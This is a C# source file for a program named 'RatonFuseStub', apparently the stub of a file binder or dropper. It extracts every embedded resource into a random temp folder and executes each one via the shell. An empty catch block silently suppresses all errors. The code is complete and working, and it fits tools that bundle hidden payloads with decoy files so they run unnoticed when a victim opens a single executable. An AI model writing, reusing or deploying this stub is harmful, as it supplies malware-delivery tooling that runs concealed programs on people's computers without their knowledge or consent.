using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace RatonFuseStub
{
    internal static class Program
    {
        [STAThread]
        static void Main()
        {
            try
            {
                string tempDir = Path.Combine(
                    Path.GetTempPath(),
                    "ratonfuse_" + Guid.NewGuid().ToString("N")
                );

                Directory.CreateDirectory(tempDir);

                Assembly asm = Assembly.GetExecutingAssembly();
                string prefix = asm.GetName().Name + ".";

                foreach (string res in asm.GetManifestResourceNames())
                {
                    if (res.EndsWith(".resources"))
                        continue;

                    Stream s = asm.GetManifestResourceStream(res);
                    if (s == null || s.Length == 0)
                        continue;

                    string name = res.StartsWith(prefix)
                        ? res.Substring(prefix.Length)
                        : res;

                    string outPath = Path.Combine(tempDir, name);

                    using (s)
                    using (FileStream fs = File.Create(outPath))
                    {
                        s.CopyTo(fs);
                    }

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = outPath,
                        UseShellExecute = true
                    });
                }
            }
            catch
            {
            }
        }
    }
}
